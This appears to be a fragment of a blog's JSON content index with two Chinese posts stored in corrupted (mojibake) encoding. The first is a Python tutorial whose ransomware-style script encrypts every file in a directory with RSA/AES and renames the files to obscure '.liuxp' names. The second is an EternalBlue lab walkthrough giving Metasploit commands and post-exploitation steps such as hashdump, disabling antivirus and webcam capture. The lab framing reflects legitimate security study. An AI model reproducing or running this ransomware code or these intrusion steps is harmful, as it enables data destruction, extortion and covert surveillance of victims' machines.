KEY-----\nMIIFJTBPBgkqhkiG9w0BBQ0wQjAhBgkrBgEEAdpHBAswFAQIYFPAcEnz9NUCAkAA\nAgEIAgEBMB0GCWCGSAFlAwQBAgQQV9WQuQ24VS4bv3+pL+lm3ASCBNBw9SW3QVpT\nIgTS6uoi7HqXmI1eJW2YTz+SxPxQbTaS0fSPG21JoumOqYIzNoQ970fefOPiwiNB\nUuW46O9y/lGq3plisy9rKxmFNxjos5Dk3BBM/mOEAc5FS9i/PfKkExgCsIZ9eLpi\nwYt3n1myGJifopjmbjYd6ztHs+wOfyVtid87f+gYusSXk3Ne4Yn2FXqSOL3qKBTa\nPVB/Go/DfT3d50OghNC2x2WpVb69dXH68KqEIQEmCEU9QR9efOyD8DzggWMAPdAR\n1qJpSGIAtAf/vFV4QG+eFtZanzg3PywoRHkEaLo5CJbQb0K/5QaLFM7SE4iHecAI\nTZAepi92T1bCa0eyDUFf/RU0mgISrwzfpDzrxgnXjP3ksmLPDrCocXn2Kenvrnqv\nmrHwh3d4Y8qoCGEwtPuc3t1N5nNq7cd1BWhtt1E/scAp3B4pg6f3hPuWApXKzGwK\n1ru6RJrZ/yhvMTsXX7fASpKnUcJw20fOl5jqsNae0GufZnRTmEwjXzh5uyh7oKYx\nha2OycJWcaZTm6Yo6h7OfAAZfvWgT0sSg7q2Rw/v13laxAZFHlWwLek1L9vtOjXM\nRU/WSJxksg42WUWlL1EOF+GYsX5hwXEGpHNLJmkbeAWblx7xYvlYkkognhbAG/Pe\n2QJwbbhfFmQO3NSj8usT+3f0YpPodPXvprk6qosLnhPBjK/NYxYuI/PsRME6Jm02\nvQWgSB34vPS2NtxEt2WEtRSGAgwsLPo1U8GaGLLe5DCbXUbbm01/rd24VqY4I3fk\nhY8tw6V5PmBvJ3RlD4Q7xSdHTQnU05sDBg3WJ+gU4uNMYQxzs/2UxyRJfd7gHwt8\nJ4enD1ch0G1v5KeXRJNj2AatL8U3oSqm+4ZPzT/riRLB485yCljUwxFK18O2Rgy3\npurKYfk3Vh+M4UTVdmvOlNzaY7ll/kKGAeIz1CMBiyBDm3n0GOrTUT+UtMKgib6V\nXP6fVZ3A33oa2+cbaRX+4inShyNFly+FTjebHZ3qOBoKv9yJ2ZkeSwWhocpfZyG1\nLBidZFC6cKlzAuOalKAnk+FpkNAms7VBppjSZUiULqOdFbiJREN8tlVumQh4rNkm\nehaHywx1KYQxhi1wKoD5eqKhgjiIdGja9ojxXbS1QMZJhz5W7/uSvfLxXQrL4F6T\nZxwdF+w85+SJQq6d4MmLjyIDbdivsNg+m1t3kiaRRcVgBotFgT0qLVdqmB/Townt\naYnDBCJ6EgnWSGwNMqMOR9wwIp9x01UbMpM8r86DDmQlLKDh+oqi4WAdYoAgAt+5\n7Wwb45GsrgaX6YrQ42W364wsYsJSLkcrx2XuL221pZgm4wCxrKQ0LvpJ3zkrKLLF\nIiB2UEpKG02MmBHpUktS0P9WE3uLg11LlGMAjY785EcU5is8RIiJwWmsw31mI1aV\n/RXEdAk//2796uxxOjqoEYfieeIW8qlfiBRkxDRTqaFxlPqGm6HGs3xxIsKkylWX\nAjvyWUObRYcu8iujiCnOpCLiYUtfkxomiw0xl6hyqyLeVe0Vf6f/cTEKYRDfUpVS\n+Znqj5IfgE/7mqDl2rjH8SnsvBb2BMK/kMGjPuOIDFfbaXy+s9f9bGH6I/g2D57W\nG5V6ZnooEecwqjFhZ1xHKMtvDcPAO0ivEw==\n-----END ENCRYPTED PRIVATE KEY-----\n```\n\nå½“ç„¶æ¯æ¬¡è¿è¡Œçš„ç»“æœéƒ½ä¸ä¸€å®šï¼Œå…¬é’¥æ˜¯å…¬å¼€çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥çœ‹åˆ°ï¼Œä½†æ˜¯ç§é’¥ä¸€å®šè¦ä¿å­˜å¥½ï¼Œå¦åˆ™ä¸€æ—¦æ³„éœ²ï¼Œæ„å‘³ç€ä½ çš„ä¿¡æ¯ä¹Ÿä¸å®‰å…¨äº†ã€‚\n\n### æ–‡ä»¶åŠ å¯†\n\nç°åœ¨æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•å¯¹æ–‡ä»¶è¿›è¡ŒåŠ å¯†å¤„ç†ï¼š\n\n```python\nfrom Crypto.Cipher import AES, PKCS1_OAEP\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Random import get_random_bytes\n\n\ndef Encrypt(filename):\n    data = ''\n    # äºŒè¿›åˆ¶åªè¯»æ‰“å¼€æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶æ•°æ®\n    with open(filename, 'rb') as f:\n        data = f.read()\n    with open(filename, 'wb') as out_file:\n        # æ”¶ä»¶äººç§˜é’¥ - å…¬é’¥\n        recipient_key = RSA.import_key(open('zmy_rsa.pub').read())\n        # ä¸€ä¸ª 16 å­—èŠ‚çš„ä¼šè¯å¯†é’¥\n        session_key = get_random_bytes(16)\n        # Encrypt the session key with the public RSA key\n        cipher_rsa = PKCS1_OAEP.new(recipient_key)\n        out_file.write(cipher_rsa.encrypt(session_key))\n        # Encrypt the data with the AES session key\n        cipher_aes = AES.new(session_key, AES.MODE_EAX)\n\n        ciphertext, tag = cipher_aes.encrypt_and_digest(data)\n        out_file.write(cipher_aes.nonce)\n        out_file.write(tag)\n        out_file.write(ciphertext)\n\n\nEncrypt(\"e://test/music.mp3\")\n\n```\n\næˆ‘ä»¬æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºå†™å…¥æ•°æ®ã€‚æ¥ç€æˆ‘ä»¬å¯¼å…¥å…¬é’¥èµ‹ç»™ä¸€ä¸ªå˜é‡ï¼Œåˆ›å»ºä¸€ä¸ª 16 å­—èŠ‚çš„ä¼šè¯å¯†é’¥ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨æ··åˆåŠ å¯†æ–¹æ³•ï¼Œå³ PKCS#1 OAEP ï¼Œä¹Ÿå°±æ˜¯æœ€ä¼˜éå¯¹ç§°åŠ å¯†å¡«å……ã€‚è¿™å…è®¸æˆ‘ä»¬å‘æ–‡ä»¶ä¸­å†™å…¥ä»»æ„é•¿åº¦çš„æ•°æ®ã€‚æ¥ç€æˆ‘ä»¬åˆ›å»º AES åŠ å¯†ï¼Œè¦åŠ å¯†çš„æ•°æ®ï¼Œç„¶ååŠ å¯†æ•°æ®ã€‚æˆ‘ä»¬å°†å¾—åˆ°åŠ å¯†çš„æ–‡æœ¬å’Œæ¶ˆæ¯è®¤è¯ç ã€‚æœ€åï¼Œæˆ‘ä»¬å°†éšæœºæ•°ï¼Œæ¶ˆæ¯è®¤è¯ç å’ŒåŠ å¯†çš„æ–‡æœ¬å†™å…¥æ–‡ä»¶ã€‚\n\nåŠ å¯†åï¼Œè¿™ä¸ªæ—¶å€™ä½ è‚¯å®šæ²¡æœ‰åŠæ³•æŒ‰ç…§åŸæ¥çš„æ–¹å¼æ‰“å¼€ä½ çš„æ–‡ä»¶äº†ï¼Œæˆ–è€…ä½ èƒ½æ‰“å¼€ï¼Œæ˜¾ç¤ºçš„ä¹Ÿæ˜¯ä¹±ç ã€‚\n\n### ç§é’¥è§£å¯†\n\n```python\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import AES, PKCS1_OAEP\n\n\ndef Descrypt(filename):\n    code = 'nooneknows'\n    with open(filename, 'rb') as fobj:\n        # å¯¼å…¥ç§é’¥\n        private_key = RSA.import_key(open('zmy_rsa').read(), passphrase=code)\n        # ä¼šè¯å¯†é’¥ï¼Œ éšæœºæ•°ï¼Œæ¶ˆæ¯è®¤è¯ç ï¼Œæœºå¯†çš„æ•°æ®\n        enc_session_key, nonce, tag, ciphertext = [fobj.read(x)\n                                                   for x in (private_key.size_in_bytes(),\n                                                             16, 16, -1)]\n        cipher_rsa = PKCS1_OAEP.new(private_key)\n        session_key = cipher_rsa.decrypt(enc_session_key)\n        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n        # è§£å¯†\n        data = cipher_aes.decrypt_and_verify(ciphertext, tag)\n\n    with open(filename, 'wb') as wobj:\n        wobj.write(data)\n\n\nDescrypt(\"e://test/music.mp3\")\n\n```\n\næˆ‘ä»¬å…ˆä»¥äºŒè¿›åˆ¶æ¨¡å¼è¯»å–æˆ‘ä»¬çš„åŠ å¯†æ–‡ä»¶ï¼Œç„¶åå¯¼å…¥ç§é’¥ã€‚æ³¨æ„ï¼Œå½“ä½ å¯¼ç§é’¥æ—¶ï¼Œéœ€è¦æä¾›ä¸€ä¸ªå¯†ç ï¼Œå¦åˆ™ä¼šå‡ºç°é”™è¯¯ã€‚ç„¶åï¼Œæˆ‘ä»¬æ–‡ä»¶ä¸­è¯»å–æ•°æ®ï¼Œé¦–å…ˆæ˜¯åŠ å¯†çš„ä¼šè¯å¯†é’¥ï¼Œç„¶åæ˜¯ 16 å­—èŠ‚çš„éšæœºæ•°å’Œ 16 å­—èŠ‚çš„æ¶ˆæ¯è®¤è¯ç ï¼Œæœ€åæ˜¯å‰©ä¸‹çš„åŠ å¯†çš„æ•°æ®ã€‚\n\næ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦è§£å¯†å‡ºä¼šè¯å¯†é’¥ï¼Œé‡æ–°åˆ›å»º AES å¯†é’¥ï¼Œç„¶åè§£å¯†å‡ºæ•°æ®ã€‚\n\nè§£å¯†å®Œæˆåï¼Œæˆ‘ä»¬ä¼šå‘ç°åˆšåˆšæ‰“ä¸å¼€æˆ–è€…æ— æ³•æ­£ç¡®æ˜¾ç¤ºçš„æ–‡ä»¶ï¼Œåˆæ¢å¤æ­£å¸¸äº†ï¼\n\n### å˜æ›´æ–‡ä»¶å\n\nå½“ç„¶è‡³æ­¤ï¼Œæ–‡ä»¶åŠ å¯†çš„éƒ¨åˆ†å·²ç»å®Œæˆï¼Œä½†æ˜¯ä¸ºäº†ä½¿è¿™ä¸ªæ›´åƒç—…æ¯’ï¼Œæˆ‘ä»¬å¯ä»¥æ¨¡æ‹Ÿhackerçš„åšæ³•ï¼Œç›´æ¥æŠŠæ•´ä¸ªæ–‡ä»¶çš„åç¼€åæ”¹æ‰ï¼Œæˆ–è€…æ›´æ··è›‹ä¸€ç‚¹ï¼Œæˆ‘å°±æ˜¯æƒ³æç ´åï¼Œç›´æ¥æŠŠæ–‡ä»¶åå­—æ”¹æˆä¸€ä¸²æ²¡æœ‰æ„ä¹‰çš„æ•°å€¼ï¼š\n\nä¸¾ä¾‹æ¯”å¦‚ï¼šblog2.rar ==> yFmcuIzZvxmY.liuxp\n\n```python\nimport os\nimport base64\n\n\ndef RenameFile(dir, filename):\n    filename_bytes = filename.encode('utf-8')\n    filename_bytes_base64 = base64.encodebytes(filename_bytes)\n\n    filename_bytes_base64 = filename_bytes_base64[::-1][1:]  # å€’åº\n    new_filename = filename_bytes_base64.decode('utf-8') + '.liuxp'\n\n    # print (new_filename)\n    print(os.path.join(dir, filename))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, filename), os.path.join(dir, new_filename))\n\n\nRenameFile(\"e:/test/\", \"cool.png\")\n\n```\n\nä½¿ç”¨äº†base64å¯¹æ–‡ä»¶åè¿›è¡Œç¼–ç ã€‚\n\n### æ¢å¤æ–‡ä»¶å\n\nä¸¾ä¾‹æ¯”å¦‚: yFmcuIzZvxmY.liuxp ==> blog2.rar\n\n```python\nimport os\nimport base64\n\n\ndef RestoreFilename(dir, filename):\n    f = filename\n    filename = filename[::-1][6:][::-1]\n    filename_base64 = filename[::-1] + '\\n'\n    filename_bytes_base64 = filename_base64.encode('ascii')  # encode as ASCII\n    ori_filename = base64.decodebytes(filename_bytes_base64).decode('utf-8')\n    new_filename = ori_filename\n\n    # print(new_filename)\n    print(os.path.join(dir, f))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, f), os.path.join(dir, new_filename))\n\n\nRestoreFilename(\"e://test/\", \"0hHdu8GbsVGa.liuxp\")\n\n```\n\nä½¿ç”¨äº†base64å¯¹æ–‡ä»¶è¿›è¡Œè§£ç ã€‚\n\n### å®Œæ•´æºç \n\næˆ‘ä»¬æŠŠä¸Šè¿°å‡ ä¸ªè¿‡ç¨‹æ•´åˆèµ·æ¥ï¼Œç„¶åå®ç°å¯¹æŸä¸€ä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶è¿›è¡Œä¸å¯¹ç§°åŠ å¯†å’Œä¸å¯¹ç§°è§£å¯†ï¼š\n\n```python\n# coding=utf-8\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Cipher import AES, PKCS1_OAEP\nimport os\nimport base64\n\n\ndef CreateRSAKeys():\n    code = 'nooneknows'\n    key = RSA.generate(2048)\n    encrypted_key = key.exportKey(passphrase=code, pkcs=8, protection=\"scryptAndAES128-CBC\")\n    # ç§é’¥\n    with open('zmy_rsa', 'wb') as f:\n        f.write(encrypted_key)\n    # å…¬é’¥\n    with open('zmy_rsa.pub', 'wb') as f:\n        f.write(key.publickey().exportKey())\n\n\ndef Encrypt(filename):\n    data = ''\n    with open(filename, 'rb') as f:\n        data = f.read()\n    with open(filename, 'wb') as out_file:\n        # æ”¶ä»¶äººç§˜é’¥ - å…¬é’¥\n        recipient_key = RSA.import_key(open('zmy_rsa.pub').read())\n        session_key = get_random_bytes(16)\n        # Encrypt the session key with the public RSA key\n        cipher_rsa = PKCS1_OAEP.new(recipient_key)\n        out_file.write(cipher_rsa.encrypt(session_key))\n        # Encrypt the data with the AES session key\n        cipher_aes = AES.new(session_key, AES.MODE_EAX)\n        ciphertext, tag = cipher_aes.encrypt_and_digest(data)\n        out_file.write(cipher_aes.nonce)\n        out_file.write(tag)\n        out_file.write(ciphertext)\n\n\ndef Descrypt(filename):\n    code = 'nooneknows'\n    with open(filename, 'rb') as fobj:\n        # å¯¼å…¥ç§é’¥\n        private_key = RSA.import_key(open('zmy_rsa').read(), passphrase=code)\n        # ä¼šè¯å¯†é’¥ï¼Œ éšæœºæ•°ï¼Œæ¶ˆæ¯è®¤è¯ç ï¼Œæœºå¯†çš„æ•°æ®\n        enc_session_key, nonce, tag, ciphertext = [fobj.read(x)\n                                                   for x in (private_key.size_in_bytes(),\n                                                             16, 16, -1)]\n        cipher_rsa = PKCS1_OAEP.new(private_key)\n        session_key = cipher_rsa.decrypt(enc_session_key)\n        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n        # è§£å¯†\n        data = cipher_aes.decrypt_and_verify(ciphertext, tag)\n\n    with open(filename, 'wb') as wobj:\n        wobj.write(data)\n\n\ndef RenameFile(dir, filename):\n    filename_bytes = filename.encode('utf-8')\n    filename_bytes_base64 = base64.encodebytes(filename_bytes)\n\n    filename_bytes_base64 = filename_bytes_base64[::-1][1:]\n    new_filename = filename_bytes_base64.decode('utf-8') + '.liuxp'\n\n    # print (new_filename)\n    print(os.path.join(dir, filename))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, filename), os.path.join(dir, new_filename))\n\n\ndef ReserveFilename(dir, filename):\n    f = filename\n    filename = filename[::-1][6:][::-1]\n    filename_base64 = filename[::-1] + '\\n'\n    filename_bytes_base64 = filename_base64.encode('ascii')  # encode as ASCII\n    ori_filename = base64.decodebytes(filename_bytes_base64).decode('utf-8')\n    new_filename = ori_filename\n\n    # print(new_filename)\n    print(os.path.join(dir, f))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, f), os.path.join(dir, new_filename))\n\n\n# è§£å¯†ä»£ç \n# def Main(rootDir):\n#     list_dirs = os.walk(rootDir)\n#     for root, dirs, files in list_dirs:\n#         if False:\n#             # éå†æ–‡ä»¶ï¼ŒåŠ å¯†å¹¶ä¸”æ”¹å\n#             for f in files:\n#                 filename = os.path.join(root, f)\n#                 Encrypt(filename)\n#                 RenameFile(root, f)\n#         else:\n#             # éå†æ–‡ä»¶ï¼Œè§£å¯†å¹¶ä¸”æ¢å¤åå­—\n#             for f in files:\n#                 if f.endswith('.liuxp'):\n#                     filename = os.path.join(root, f)\n#                     Descrypt(filename)\n#                     ReserveFilename(root, f)\n\n# åŠ å¯†ä»£ç \ndef Main(rootDir):\n    list_dirs = os.walk(rootDir)\n    for root, dirs, files in list_dirs:\n        # åˆ‡æ¢åŠ å¯†å’Œè§£å¯†è¿‡ç¨‹\n        # if False:   # è§£å¯†æ–‡ä»¶\n        if True:  # åŠ å¯†æ–‡ä»¶\n            # éå†æ–‡ä»¶ï¼ŒåŠ å¯†å¹¶ä¸”æ”¹å\n            for f in files:\n                filename = os.path.join(root, f)\n                Encrypt(filename)\n                RenameFile(root, f)\n        else:\n            # éå†æ–‡ä»¶ï¼Œè§£å¯†å¹¶ä¸”æ¢å¤åå­—\n            for f in files:\n                filename = os.path.join(root, f)\n                Descrypt(filename)\n                ReserveFilename(root, f)\n\n\nif __name__ == '__main__':\n    # CreateRSAKeys()\n    d = \"e://test/\"\n    Main(d)\n\n```\n\nå”¯ä¸€è¦æåˆ°çš„å°±æ˜¯æœ€åçš„mainå‡½æ•°ï¼Œé€šè¿‡æ³¨é‡Šif ture å’Œ if false åˆ‡æ¢è¿›è¡Œæ–‡ä»¶çš„åŠ å¯†å’Œè§£å¯†ï¼Œä¸€å®šè¦æ³¨æ„ä»£ç ç¼©è¿›ã€‚\n\nä»¥ä¸‹æ˜¯å‡ ä¸ªå®ç°çš„æ•ˆæœå›¾ï¼š\n\n![åŠ å¯†ä¹‹å‰](./Python-encrypted-file/1.png)\n\n![åŠ å¯†ä¹‹å](./Python-encrypted-file/2.png)\n\n![è§£å¯†ä¹‹å](./Python-encrypted-file/3.png)\n\n### å†™åœ¨åé¢çš„è¯\n\næ­¤ä»£ç ä»…ä½œä¸ºå­¦ä¹ æµ‹è¯•ä½¿ç”¨ï¼Œå‰æ¥***å­¦ä¹ ***çš„å°ä¼™ä¼´è¿˜æ˜¯è¦éµè§„å®ˆçºªå•Šï¼ï¼ï¼\n\næ­¤ä»£ç ä»…ä½œä¸ºå­¦ä¹ æµ‹è¯•ä½¿ç”¨ï¼Œå‰æ¥***å­¦ä¹ ***çš„å°ä¼™ä¼´è¿˜æ˜¯è¦éµè§„å®ˆçºªå•Šï¼ï¼ï¼\n\næ­¤ä»£ç ä»…ä½œä¸ºå­¦ä¹ æµ‹è¯•ä½¿ç”¨ï¼Œå‰æ¥***å­¦ä¹ ***çš„å°ä¼™ä¼´è¿˜æ˜¯è¦éµè§„å®ˆçºªå•Šï¼ï¼ï¼","tags":["python"],"categories":["æŠ€æœ¯"]},{"title":"æ°¸æ’ä¹‹è“å¤ç°ä»¥åŠç®€å•çš„åæ¸—é€ä¿¡æ¯æ”¶é›†","url":"/2023/04/16/crypto/","content":"\n\n### ç¯å¢ƒå‡†å¤‡\n\né¦–å…ˆéœ€è¦å‡†å¤‡ä¸¤å°è™šæ‹Ÿæœºï¼Œä¸€å°è¿è¡Œkali linuxï¼Œä¸€å°è¿è¡Œwindows7ï¼Œwindowså…¶ä»–ç‰ˆæœ¬çš„æ²¡æœ‰æµ‹è¯•ï¼Œä¸è¿‡éå¸¸æœ‰å¯èƒ½å…¶ä»–ç‰ˆæœ¬å·²ç»ä¿®å¤è¿™ä¸ªbugäº†ï¼Œç”¨æ¥å­¦ä¹ æµ‹è¯•çš„è¯ï¼Œç”¨windows7æ¯”è¾ƒå¦¥å–„ã€‚\n\n<!-- more -->\n\n### ç½‘ç»œå‡†å¤‡\n\nå¿…é¡»ä¿è¯windows7å’Œkali linux åœ¨åŒä¸€ä¸ªå±€åŸŸç½‘åº•ä¸‹ï¼Œå³ä¿è¯è¿™ä¸¤å°æœºå™¨IPéƒ½æ˜¯åŒä¸€ä¸ªç½‘æ®µçš„åœ°å€ã€‚\n\n### æ”»å‡»å¼€å§‹\n\n1. ä½¿ç”¨kaliçš„nmapå·¥å…·è¿›è¡Œæ‰«æï¼ŒæŸ¥çœ‹åŒä¸€ä¸ªç½‘ç»œä¸‹ï¼Œæœ‰å“ªäº›ä¸»æœºã€‚è¿è¡Œä¸‹é¢è¿™ä¸ªå‘½ä»¤ã€‚\n\n```c\n    # nmap -T4 -A -v -Pn 192.168.20.1/24\n```\n![æ‰«æåŸŸå†…ä¸»æœº](./crypto/1.png)\n\nå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª***192.168.20.129***çš„ä¸»æœºå¯ç”¨ï¼Œå¼€å¯äº†445ç«¯å£ã€‚æˆ‘ä»¬å°±å¯¹è¿™ä¸ªä¸»æœºè¿›è¡Œæ”»å‡»ã€‚\n\n2. windowséªŒè¯ä¸€ä¸‹ï¼Œå‘ç°windowsè·å–çš„IPç¡®å®æ˜¯***192.168.20.129***\n\n![windowséªŒè¯](./crypto//2.png)\n\n3. åœ¨kaliä¸Šä½¿ç”¨å·¥å…·å¼€å§‹æ”»å‡»ï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œç¨ä½œç­‰å¾…ã€‚\n\n```c\n    # msfconsole -q  \n```\n\n> -q é€‰é¡¹ä¸å†ç»§ç»­æ‰“å°å·¥å…·å¯åŠ¨æ—¶çš„å›¾å½¢æ–‡å­—\n\n> è¿è¡Œä¹‹åæ˜¯è¿™æ ·çš„æ•ˆæœ\n\n![msfconsole](./crypto/3.png)\n\n4. æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œæœç´¢å¯ä»¥åˆ©ç”¨çš„æ¼æ´å·¥å…·\n\n```c\n    msf6 > search ms17-010\n```\n![ms17-010](./crypto/4.png)\n\n5. é€‰æ‹©åºå·ä¸º0çš„æ¼æ´è¿›è¡Œæ”»å‡»ï¼Œåˆ†åˆ«æ‰§è¡Œä»¥ä¸‹ä»£ç \n\n```c\n    msf6 > use 0\n    msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 192.168.20.50\n    msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhost 192.168.20.129\n    msf6 exploit(windows/smb/ms17_010_eternalblue) > run\n```\n\n> set lhost æ˜¯è®¾ç½®æ”»å‡»ä¸»æœºçš„IPï¼Œset rhost æ˜¯è®¾ç½®é¶æœºä¸»æœºçš„IPï¼Œrunå¼€å§‹è¿›è¡Œæ”»å‡»ã€‚\n\næ•ˆæœå›¾å¦‚ä¸‹ï¼š\n\n![å¼€å§‹æ”»å‡»](./crypto/5.png)\n\n6. ç¨ç­‰ç‰‡åˆ»ï¼Œæ”»å‡»æˆåŠŸåï¼Œå‘½ä»¤è¡Œçš„æç¤ºæ–‡å­—ä¼šå˜ä¸º**meterpreter>**ï¼Œå…¥ä¾µå®Œæˆï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å‘½ä»¤è¿›è¡Œå¯¹windowsä¸»æœºçš„ä»»ä½•æ“ä½œã€‚\n\n|å‘½ä»¤|åŠŸèƒ½|\n|:---:|:---:|\n|shell|å¯åŠ¨é¶æœºä¸»æœºçš„cmd|\n|screenshot|å¯¹é¶æœºè¿›è¡Œå±å¹•æˆªå›¾|\n|webcam_list|åˆ—å‡ºæ‘„åƒå¤´|\n|webcam_snap|åˆ©ç”¨é¶æœºæ‘„åƒå¤´æ‹ç…§|\n|webcam_stream|åˆ©ç”¨é¶æœºæ‘„åƒå¤´æ‹è§†é¢‘|\n|getuid|è·å–ç™»å½•ç”¨æˆ·|\n|getsystem|è·å–ç£ç›˜ä¿¡æ¯|\n|hashdump|è·å–å¯†ç çš„å“ˆå¸Œå€¼|\n|kill|æ€æ‰è¿›ç¨‹|\n|download|ä¸‹è½½æ–‡ä»¶|\n|upload|ä¸Šä¼ æ–‡ä»¶|\n|run killav|å…³é—­æ€è½¯|\n|run post/windows/manage/killava|å…³é—­æ€è½¯|\n|run post/windows/gather/checkkvm|æ£€æŸ¥æ˜¯å¦æ˜¯è™šæ‹Ÿæœº|\n|run post/windows/gather/enum_services|åˆ—å‡ºæ‰€æœ‰çš„æœåŠ¡|\n|run post/windows/gather/enum_applications|åˆ—å‡ºè¿è¡Œçš„ç¨‹åº|\n|run post/windows/gather/enum_patches|åˆ—å‡ºæ‰“çš„è¡¥ä¸|\n|run post/windows/gather/dumplinks|åˆ—å‡ºæœ€è¿‘çš„æ“ä½œ|\n\n\n7. ä»¥ä¸‹æ˜¯åˆ©ç”¨ä¸Šè¿°å‘½ä»¤å®ç°çš„ä¸€äº›æ•ˆæœå›¾\n\n* ä½¿ç”¨shell\n\n```c\n    meterpreter > shell\n```\n> è¿è¡Œä¹‹åæˆåŠŸè¿›å…¥shellï¼Œä½†æ˜¯ä¼šå‡ºç°éƒ¨åˆ†ä¹±ç ï¼Œæ¥ç€è¾“å…¥å‘½ä»¤`chcp 65001`ï¼Œå›è½¦åä¹±ç å˜æ­£å¸¸ã€‚\n\n![å¸…å“¥](./crypto/6.png)\n\n* å±å¹•æˆªå›¾ï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤\n\n```c\n    meterpreter > screenshot\n```\n\nè¿è¡ŒæˆåŠŸåæ¡Œé¢ä¸Šä¼šå¤šäº†ä¸€å¼ windowsçš„å±å¹•æˆªå›¾\n\n![å¸…å“¥](./crypto/7.png)\n\n* ä¸Šä¼ æ–‡ä»¶\n\nä¸Šä¼ è¿™ä¸€å¼ ç…§ç‰‡\n\n![å¸…å“¥](./crypto/8.png)\n\næ‰§è¡Œä»¥ä¸‹å‘½ä»¤\n\n```c\n    meterpreter > upload /home/kali/Desktop/shuaige.png c:\\\\shuaige.png\n```\n\n![å¸…å“¥](./crypto/9.png)\n\næ˜¾ç¤ºä¸Šä¼ æˆåŠŸï¼Œç„¶åå»windowsä¸»æœºéªŒè¯ã€‚\n\n![å¸…å“¥](./crypto/10.png)\n\nä¸Šä¼ æˆåŠŸï¼Œwindowsæ­£å¸¸æŸ¥çœ‹ã€‚\n\n* è°ƒç”¨ç½‘ç»œæ‘„åƒå¤´ï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤\n\n```c\n    meterpreter > webcam_stream\n```\n\n![å¸…å“¥](./crypto/11.png)\n\n> kali æˆåŠŸè°ƒç”¨åˆ°äº†windows7çš„æ‘„åƒå¤´\n\n### å†™åœ¨åé¢çš„è¯\n\nç½‘ç»œå¹¶ä¸æ˜¯æ³•å¤–ä¹‹åœ°ï¼Œä¸”è¡Œä¸”çæƒœã€‚","tags":["ç½‘ç»œå®‰å…¨"],"categories":["æŠ€æœ¯"]}]